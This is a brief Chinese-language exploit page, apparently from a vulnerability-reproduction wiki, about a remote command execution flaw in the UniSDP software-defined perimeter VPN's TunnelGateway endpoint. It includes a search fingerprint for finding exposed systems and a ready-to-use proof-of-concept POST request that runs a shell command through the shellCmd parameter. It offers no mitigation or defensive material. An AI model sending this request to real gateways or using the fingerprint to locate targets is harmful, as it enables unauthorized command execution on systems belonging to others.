# 联软安界 UniSDP 软件定义边界系统 commondRetSt 命令执行漏洞

## 漏洞描述

联软安界UniSDP软件定义边界系统是基于零信任的下一代VPN，该系统2021.04.28版本中TunnelGateway某接口存在安全漏洞，漏洞允许攻击者将特制请求发送到服务器并远程命令执行。

## 漏洞影响

<a-checkbox checked>联软安界 UniSDP 软件定义边界系统</a-checkbox></br>

## 网络测绘

<a-checkbox checked>title="UniSSOView"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1658977938174-b661802b-b5c7-434b-a5e7-6f51afb02db1-20230311204818783.png)

验证POC

```php
POST /TunnelGateway/commondRetStr
  
shellCmd=id
```

![img](../../../.vuepress/public/img/1658978044203-53489913-e30b-474a-accf-09c74a9189b7.png)